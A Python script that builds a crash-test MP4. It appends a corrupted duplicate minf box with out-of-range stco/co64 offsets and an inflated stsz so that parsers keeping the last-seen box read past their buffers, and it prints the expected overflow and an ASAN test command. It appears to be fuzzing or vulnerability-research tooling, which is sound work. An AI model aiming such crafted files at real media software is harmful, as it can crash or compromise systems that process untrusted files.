#!/usr/bin/env python3
"""Demonstrate last-occurrence-wins behavior in MP4 parsers.

Many parsers use a map/dict structure like:
  m_non_leaves[box_name] = parsed_box
  
This naturally implements LAST-OCCURRENCE-WINS because each assignment 
overwrites the previous value. When the parser encounters:

  mdia
    ├── minf (first)
    │   └── stbl
    │       └── stco  ← entry A
    └── minf (duplicate)
        └── stbl
            └── stco  ← entry B (overwrites entry A)

The parser ends up using the SECOND (malicious) stco.

Example parsers that use this pattern:
  - C++ std::map or similar containers
  - Python dict
  - JavaScript object properties
  
This script creates a fixture optimized for last-occurrence-wins behavior.
"""

from __future__ import annotations

import argparse
import shutil
import struct
import subprocess
import sys
import tempfile
from pathlib import Path

DEFAULT_TARGET = 1_048_576  # 1 MiB
DEFAULT_DURATION = 10.0
CONTAINERS = {b"moov", b"trak", b"mdia", b"minf", b"stbl", b"dinf", b"edts", b"udta"}


def require_tool(name: str) -> str:
    path = shutil.which(name)
    if not path:
        raise RuntimeError(f"{name} was not found on PATH. Install FFmpeg, then retry.")
    return path


def run(command: list[str]) -> None:
    print("+", " ".join(command))
    subprocess.run(command, check=True)


class Box:
    __slots__ = ("type", "payload", "children")

    def __init__(self, box_type: bytes, payload: bytes = b"", children: list["Box"] | None = None):
        self.type = box_type
        self.payload = payload
        self.children = children

    @property
    def size(self) -> int:
        if self.children is None:
            return 8 + len(self.payload)
        return 8 + sum(child.size for child in self.children)

    def to_bytes(self) -> bytes:
        body = self.payload if self.children is None else b"".join(c.to_bytes() for c in self.children)
        return struct.pack(">I4s", 8 + len(body), self.type) + body

    def find_all(self, box_type: bytes) -> list["Box"]:
        found: list[Box] = []
        if self.type == box_type:
            found.append(self)
        for child in self.children or ():
            found.extend(child.find_all(box_type))
        return found

    def copy(self) -> "Box":
        if self.children is None:
            return Box(self.type, self.payload[:])
        return Box(self.type, b"", [child.copy() for child in self.children])


def parse_boxes(data: bytes) -> list[Box]:
    boxes: list[Box] = []
    offset = 0
    while offset + 8 <= len(data):
        size, box_type = struct.unpack_from(">I4s", data, offset)
        if size == 1 or size == 0:
            boxes.append(Box(box_type, data[offset + 8:]))
            break
        if size < 8 or offset + size > len(data):
            raise ValueError(f"malformed box {box_type!r} at offset {offset}")
        body = data[offset + 8: offset + size]
        if box_type in CONTAINERS:
            boxes.append(Box(box_type, b"", parse_boxes(body)))
        else:
            boxes.append(Box(box_type, body))
        offset += size
    return boxes


def read_top_level(path: Path) -> list[tuple[bytes, int, int]]:
    """Return [(type, offset, size)] for top-level boxes without loading mdat."""
    entries: list[tuple[bytes, int, int]] = []
    with path.open("rb") as handle:
        offset = 0
        total = path.stat().st_size
        while offset < total:
            handle.seek(offset)
            header = handle.read(8)
            if len(header) < 8:
                break
            size, box_type = struct.unpack(">I4s", header)
            if size == 1:
                size = struct.unpack(">Q", handle.read(8))[0]
            elif size == 0:
                size = total - offset
            if size < 8:
                raise ValueError(f"malformed top-level box {box_type!r}")
            entries.append((box_type, offset, size))
            offset += size
    return entries


def shift_chunk_offsets(moov: Box, delta: int) -> int:
    """Rewrite stco/co64 tables after moov grows."""
    if delta == 0:
        return 0
    patched = 0
    for box in moov.find_all(b"stco"):
        count = struct.unpack_from(">I", box.payload, 4)[0]
        values = list(struct.unpack_from(f">{count}I", box.payload, 8))
        if any(value + delta >= 2**32 for value in values):
            raise ValueError("chunk offset overflow; use a smaller target size")
        box.payload = box.payload[:8] + struct.pack(f">{count}I", *(v + delta for v in values))
        patched += count
    for box in moov.find_all(b"co64"):
        count = struct.unpack_from(">I", box.payload, 4)[0]
        values = struct.unpack_from(f">{count}Q", box.payload, 8)
        box.payload = box.payload[:8] + struct.pack(f">{count}Q", *(v + delta for v in values))
        patched += count
    return patched


def corrupt_stco_in_box(box: Box, file_size: int) -> None:
    """Recursively corrupt stco/co64 in a box."""
    if box.type == b"stco":
        version_flags = box.payload[:4]
        entry_count_bytes = box.payload[4:8]
        entry_count = struct.unpack(">I", entry_count_bytes)[0]
        
        if entry_count > 0:
            out_of_range = file_size + 10_000_000
            box.payload = version_flags + entry_count_bytes + struct.pack(f">{entry_count}I", *([out_of_range] * entry_count))
    
    elif box.type == b"co64":
        version_flags = box.payload[:4]
        entry_count_bytes = box.payload[4:8]
        entry_count = struct.unpack(">I", entry_count_bytes)[0]
        
        if entry_count > 0:
            out_of_range = file_size + 10_000_000
            box.payload = version_flags + entry_count_bytes + struct.pack(f">{entry_count}Q", *([out_of_range] * entry_count))
    
    elif box.type == b"stsz":
        # Inflate uniform sample size to 100 MB
        version_flags = box.payload[:4]
        sample_size = struct.unpack_from(">I", box.payload, 4)[0]
        sample_count = struct.unpack_from(">I", box.payload, 8)[0]
        
        large_size = 100_000_000
        box.payload = version_flags + struct.pack(">I", large_size) + struct.pack(">I", sample_count)
    
    # Recurse into children
    if box.children:
        for child in box.children:
            corrupt_stco_in_box(child, file_size)


def inject_last_occurrence_wins_duplicates(moov: Box, file_size: int) -> None:
    """Inject malicious minf/stbl duplicates optimized for last-occurrence-wins parsers.
    
    The key insight:
      - Parser loops through children and stores in map: m[box_type] = parsed_box
      - Last occurrence WINS because it overwrites previous entries
      - When prepare_trak_slice() accesses m["stco"], it gets the DUPLICATE's stco
    
    To maximize likelihood of last-occurrence-wins:
      1. Keep first minf/stbl identical and valid
      2. Append second minf/stbl with corrupted stco/stsz
      3. Parser must process children in order and use map storage
    """
    mdia_boxes = moov.find_all(b"mdia")
    injected = 0
    
    for mdia in mdia_boxes:
        if not mdia.children:
            continue
        
        # Find the original minf
        original_minf = None
        for child in mdia.children:
            if child.type == b"minf":
                original_minf = child
                break
        
        if original_minf is None:
            continue
        
        # Create a copy and corrupt it
        malicious_minf = original_minf.copy()
        corrupt_stco_in_box(malicious_minf, file_size)
        
        # Append as sibling (AFTER the first minf)
        # This ensures the parser will read it AFTER the first and overwrite in the map
        mdia.children.append(malicious_minf)
        injected += 1
    
    if not injected:
        raise ValueError("no minf boxes found")
    
    print(f"Injected {injected} malicious minf duplicate(s) (appended after originals)")
    print()
    print("Parser behavior with last-occurrence-wins:")
    print("  1. Parser loops: for child in mdia.children")
    print("  2. Encounters first minf:  m_non_leaves['minf'] = first_minf")
    print("  3. Encounters second minf: m_non_leaves['minf'] = second_minf  ← OVERWRITES")
    print("  4. prepare_trak_slice() uses m_non_leaves['minf'] → gets malicious version")
    print()


def encode_source(destination: Path, target_bytes: int, duration: float) -> None:
    ffmpeg = require_tool("ffmpeg")
    if target_bytes < 64 * 1024:
        raise ValueError("target size must be at least 65536 bytes")
    if duration <= 0:
        raise ValueError("duration must be greater than zero")
    
    total_bitrate = int((target_bytes * 8 / duration) * 0.90)
    audio_bitrate = 96_000
    video_bitrate = max(100_000, total_bitrate - audio_bitrate)
    
    run([
        ffmpeg, "-y", "-hide_banner", "-loglevel", "error",
        "-f", "lavfi", "-i", "testsrc2=size=640x360:rate=30",
        "-f", "lavfi", "-i", "sine=frequency=1000:sample_rate=48000",
        "-t", str(duration),
        "-map", "0:v:0", "-map", "1:a:0",
        "-c:v", "libx264", "-preset", "veryfast", "-b:v", str(video_bitrate),
        "-pix_fmt", "yuv420p",
        "-c:a", "aac", "-b:a", str(audio_bitrate),
        "-movflags", "+faststart",
        str(destination),
    ])


def build_output(source: Path, output: Path) -> None:
    entries = read_top_level(source)
    moov_entry = next((e for e in entries if e[0] == b"moov"), None)
    if moov_entry is None:
        raise ValueError("source MP4 has no moov box")
    
    _, moov_offset, moov_size = moov_entry
    
    with source.open("rb") as handle:
        handle.seek(moov_offset)
        moov_bytes = handle.read(moov_size)
    moov = parse_boxes(moov_bytes)[0]
    
    final_file_size = source.stat().st_size
    inject_last_occurrence_wins_duplicates(moov, final_file_size)
    
    delta = moov.size - moov_size
    patched = shift_chunk_offsets(moov, delta)
    print(f"moov grew by {delta:,} bytes; rewrote {patched} chunk offset(s)")
    
    output.parent.mkdir(parents=True, exist_ok=True)
    new_moov = moov.to_bytes()
    
    with source.open("rb") as src, output.open("wb") as dst:
        for box_type, offset, size in entries:
            if box_type == b"moov":
                dst.write(new_moov)
                continue
            src.seek(offset)
            remaining = size
            while remaining:
                chunk = src.read(min(remaining, 1024 * 1024))
                if not chunk:
                    raise ValueError("unexpected end of source file")
                dst.write(chunk)
                remaining -= len(chunk)


def generate(output: Path, target_bytes: int, duration: float) -> None:
    ffprobe = require_tool("ffprobe")
    
    with tempfile.TemporaryDirectory() as tmp:
        source = Path(tmp) / "source.mp4"
        encode_source(source, target_bytes, duration)
        
        run([
            ffprobe, "-v", "error", "-select_streams", "v:0",
            "-show_entries", "stream=codec_name,width,height",
            "-of", "default=noprint_wrappers=1", str(source),
        ])
        
        build_output(source, output)
    
    size = output.stat().st_size
    print(f"Created: {output}")
    print(f"Size: {size:,} bytes ({size / (1024 * 1024):.3f} MiB)")
    print()
    print("⚠️  LAST-OCCURRENCE-WINS FIXTURE ⚠️")
    print()
    print("Vulnerability trigger:")
    print("  • Parser stores minf/stco/stsz in a map with last-occurrence-wins")
    print("  • First minf:  valid stco pointing into mdat, normal stsz")
    print("  • Second minf: malicious stco (10MB+ out of range), stsz (100MB per sample)")
    print()
    print("Parser execution:")
    print("  for child in mdia.children:")
    print("      if child.type == 'minf':")
    print("          m_non_leaves['minf'] = child  # OVERWRITES each iteration")
    print()
    print("Expected crash in prepare_trak_slice():")
    print("  stco[0] = 10,961,936    (out of range)")
    print("  stsz[0] = 100,000,000   (per sample)")
    print("  total = 10,961,936 + (100M × 300) = ~30GB → buffer overflow")
    print()
    print("Test with sanitizers:")
    print(f"  ASAN_OPTIONS=halt_on_error=1 ./parser {output}")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    default_dir = Path(__file__).resolve().parent / "output"
    parser.add_argument("--output", type=Path,
                        default=default_dir / "crash_mp4_last_occurrence_wins.mp4",
                        help="output MP4 path")
    parser.add_argument("--size", type=int, default=DEFAULT_TARGET,
                        help="approximate target size in bytes (default: 1048576)")
    parser.add_argument("--duration", type=float, default=DEFAULT_DURATION,
                        help="duration in seconds (default: 10)")
    args = parser.parse_args()
    
    try:
        generate(args.output, args.size, args.duration)
    except (RuntimeError, ValueError, subprocess.CalledProcessError) as exc:
        print(f"Error: {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
